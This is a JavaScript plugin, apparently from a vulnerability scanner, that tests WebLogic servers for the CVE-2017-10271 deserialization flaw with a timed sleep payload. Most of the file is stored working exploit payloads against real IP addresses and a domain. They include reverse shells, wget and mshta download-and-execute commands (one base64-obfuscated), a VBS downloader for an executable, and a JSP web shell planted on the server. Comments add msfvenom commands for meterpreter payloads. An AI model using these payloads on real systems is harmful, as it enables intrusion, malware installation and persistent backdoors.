module.exports={
	tags:"weblogic,CVE-2017-10271,10271,3506",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self, szOld = url,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/CoordinatorPortType,/wls-wsat/CoordinatorPortType11,/wls-wsat/ParticipantPortType,/wls-wsat/ParticipantPortType11,/wls-wsat/RegistrationPortTypeRPC,/wls-wsat/RegistrationPortTypeRPC11,/wls-wsat/RegistrationRequesterPortType,/wls-wsat/RegistrationRequesterPortType11'.split(',');
		var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
    <!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
    
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

*/}),s1 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("162.219.126.11",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s2 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -d|sh]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s4 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA[mshta http://hk-7.tk/1.jpg]]></string>
                <!--
                <string><![CDATA['del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs']]></string>
                -->
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s5 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <void class = "java.io.FileOutputStream">
          <object class = "java.io.File">
            <string>/dev/tcp/23.105.209.65/777</string>
          </object>
        </void>
    </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

*/}),s6 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <java version="1.4.0" class="java.beans.XMLDecoder">
          <object class="java.io.PrintWriter">
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
            <void method="println">
              <string><![CDATA[<%if("secfree".equals(request.getParameter("password"))){  
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("command")).getInputStream();  
        int a = -1;  
        byte[] b = new byte[2048];  
        out.print("<pre>");  
        while((a=in.read(b))!=-1){  
            out.println(new String(b));  
        }  
        out.print("</pre>");  
    }%>]]></string>
            </void>
            <void method="close"/>
          </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/></soapenv:Envelope>

*/});
// 
// bash -i >& /dev/tcp/23.105.209.65/9999 0>&1
// python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=12345 LHOST=23.105.209.65 -f elf  -o ./linuxRvsTcp123.elf
// msfvenom -a x86 --platform linux -p  payload/linux/x86/shell/reverse_tcp LPORT=1234 LHOST=23.105.209.65  -e x86/shikata_ga_nai -b '\x00' -i 8 -f elf -o linuxRvsTcp123.elf
// x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &

		var nNum = new Date().getTime()/1000,nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
		s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s6;
    var hst = _s.parseUrl(url);

    // console.log(hst);
    for(var i = 0; i < aPath.length; i++)
    {
      url = szOld.substr(0, szOld.indexOf('/',13)) + aPath[i];// '/wls-wsat/CoordinatorPortType'
      // console.log(url);
      var oOpt = _s.fnOptHeader({
        method: 'POST',
        uri: url,
        body:s
          ,headers:
          {
            "Host":hst.host,
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Accept-Encoding":"zh-CN,zh",
            "content-type":"text/xml;charset=UTF-8"
          }});
      oOpt.timeout = nTime + 5000;
  		_s.request(oOpt
  		  , function (error, response, body)
  		  {
          _s.error(error);
          body = body || String(error);
  		  	if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
  		  	{
  		  		_s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));

  		  		return;
  		  	}
  		  	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
  		  	// console.log(String(body));
  		  	// console.log([nT,nT2]);

          // console.log(response.headers);
          console.log(body);
  		  	
  	  		if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
  	  		{
  	  			var r = {vul:true,"body":String(body),href:response.request.uri.href,"url":szOld,"send":s,"des":
  	  				"发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
  	  				statusCode:(response && response.statusCode||0)};
              // X-Powered-By,Set-Cookie,Date
              // X-Pad: avoid browser bug
  	  			// console.log(r);
  	  			fnCbk(r,_t);
  	  		}
  	  		else _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));
  	  		//console.log(body);
  		   }
  		 );
    }
	}
};